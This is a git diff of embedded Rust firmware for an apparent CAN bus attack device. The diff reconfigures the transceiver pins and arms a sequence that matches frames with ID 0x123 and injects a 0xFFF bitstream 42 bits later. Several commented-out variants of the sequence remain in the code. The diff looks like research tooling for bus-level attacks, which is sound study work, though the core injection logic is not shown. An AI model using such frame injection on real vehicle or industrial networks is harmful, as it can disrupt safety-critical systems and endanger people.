@@ -129,8 +129,8 @@ async fn main(spawner: Spawner) {
     let led = Output::new(p.PC13, Level::High, Speed::Low);
     spawner.spawn(blink_task(led)).unwrap();
 
-    let tx = Output::new(p.PA10, Level::Low, Speed::VeryHigh);
-    let rx = Input::new(p.PA9, Pull::None);
+    let tx = Output::new(p.PA10, Level::High, Speed::VeryHigh);
+    let rx = Input::new(p.PA9, Pull::Up);
     let force = Output::new(p.PA11, Level::Low, Speed::VeryHigh);
 
     let tranceiver = BpTr::new(tx, rx, force);
@@ -145,7 +145,8 @@ async fn main(spawner: Spawner) {
     let cp = cortex_m::Peripherals::take().unwrap();
     let systick = SystickClock::new(cp.SYST);
 
-    let bsp: EvilBsp<_, _> = EvilBsp::new_with_mcp2515(spi, delay, systick, tranceiver);
+    // let bsp: EvilBsp<_, _> = EvilBsp::new_with_mcp2515(spi, delay, systick, tranceiver);
+    let bsp: EvilBsp<_, _> = EvilBsp::new(systick, tranceiver);
 
     info!("BSP created");
 
@@ -157,19 +158,37 @@ async fn main(spawner: Spawner) {
 
     Timer::after_millis(100).await;
 
+
     loop {
     
         core.arm(
             &[
-                AttackCmd::Wait { bits: 46 },
-                AttackCmd::Force {
-                    stream: BitStream::from_u8(0b1, 1)
-                },
+
+                // AttackCmd::Wait { bits: 1 },
+                // AttackCmd::Match { stream: BitStream::from_u32(0x123, 11) },
+                // AttackCmd::Wait { bits: 3 },
+                // AttackCmd::Read { len: 4 },
+                // AttackCmd::WaitBuffered,
+                // AttackCmd::Wait { bits: 42 },
+                // AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },
+
+
+
+                AttackCmd::Wait { bits: 1 },
+                AttackCmd::Match { stream: BitStream::from_u32(0x123, 11) },
+                AttackCmd::Wait { bits: 42 },
+                AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },
+
+                // AttackCmd::Wait { bits: 46 + 8 },
+                // AttackCmd::Wait { bits: 9 },
+                // AttackCmd::Send { stream: BitStream::from_u32(0xFFF, 12) },
+                // AttackCmd::Force { stream: BitStream::from_u32(0xFFF, 12) },
             ]
         ).unwrap();
 
-        info!("Attack armed");
+        Timer::after_millis(100).await;
 
+        info!("Attack armed");
 
         cortex_m::interrupt::free(
             |_| {
@@ -178,5 +197,6 @@ async fn main(spawner: Spawner) {
         );
 
         info!("Attack has finished");
+
     }
 }
